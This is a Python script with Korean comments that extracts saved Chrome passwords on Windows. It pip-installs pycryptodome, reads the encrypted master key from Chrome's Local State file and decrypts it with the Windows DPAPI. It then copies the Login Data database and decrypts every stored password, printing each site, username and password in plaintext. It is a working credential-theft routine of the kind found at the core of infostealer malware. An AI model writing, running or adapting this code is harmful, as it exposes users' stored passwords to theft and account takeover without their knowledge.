import subprocess
import sys

package_name = "pycryptodome"
try:
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
    print(f"'{package_name}' 패키지가 성공적으로 설치되었습니다.")
except subprocess.CalledProcessError as e:
    print(f"패키지 설치 실패: {e}")

import os
import sqlite3
import json
import base64
import ctypes
import ctypes.wintypes
from Crypto.Cipher import AES
from shutil import copy2


# Windows Data Protection API를 이용한 보환화 함수
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_byte))]


def decrypt_windows_data_protected(encrypted_data):
    encrypted_blob = DATA_BLOB()
    encrypted_blob.cbData = len(encrypted_data)
    encrypted_blob.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_data, len(encrypted_data)),
                                        ctypes.POINTER(ctypes.c_byte))

    decrypted_blob = DATA_BLOB()

    if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(encrypted_blob),  # 암호화된 데이터
            None,  # 설명 (사용되지 않음)
            None,  # 추가 엔트로피 (옵션)
            None,  # 예제된부분 (사용되지 않음)
            None,  # 프론프트 구조체 (사용되지 않음)
            0,  # 플래그 (0으로 설정)
            ctypes.byref(decrypted_blob)  # 보환화된 데이터를 저장할 Blob
    ):
        decrypted_data = ctypes.string_at(decrypted_blob.pbData, decrypted_blob.cbData)
        ctypes.windll.kernel32.LocalFree(decrypted_blob.pbData)
        return decrypted_data
    else:
        raise Exception("Decryption failed: DPAPI could not decrypt the data.")


# AES 암호화된 크롬 비밀로 보환화 함수
def decrypt_aes(encrypted_data, key):
    try:
        # AES GCM 모드를 사용하여 데이터 보환화
        nonce = encrypted_data[3:15]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(encrypted_data[15:-16], encrypted_data[-16:])
        return decrypted_data.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Failed to decrypt with AES: {str(e)}"


# 크롬 로그인 데이터베이스 파일 경로 설정
chrome_login_data_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")

# Local State 파일 경로 설정 및 AES 키 추출
local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
with open(local_state_path, "r", encoding="utf-8") as file:
    local_state = json.load(file)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # 'DPAPI' 헤더를 제거
    aes_key = decrypt_windows_data_protected(encrypted_key)

# 데이터베이스 파일을 안전하게 사용하기 위해 임시 파일로 복사
temp_db_path = os.path.join(os.getenv("LOCALAPPDATA"), "temp_login_data.db")
copy2(chrome_login_data_path, temp_db_path)

# SQLite 데이터베이스 연결
connection = sqlite3.connect(temp_db_path)
cursor = connection.cursor()

# 로그인 정보 코드 실행
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
login_data = cursor.fetchall()

# 로그인 정보 출력
for origin_url, username, encrypted_password in login_data:
    if encrypted_password:
        if encrypted_password[:3] == b'v10':  # 크롬의 암호화 버전 확인
            decrypted_password = decrypt_aes(encrypted_password, aes_key)
        else:
            try:
                decrypted_password = decrypt_windows_data_protected(encrypted_password)
            except Exception as e:
                decrypted_password = f"Failed to decrypt password: {str(e)}"

        print(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n")

# 데이터베이스 연결 종료 및 임시 파일 삭제
cursor.close()
connection.close()
os.remove(temp_db_path)
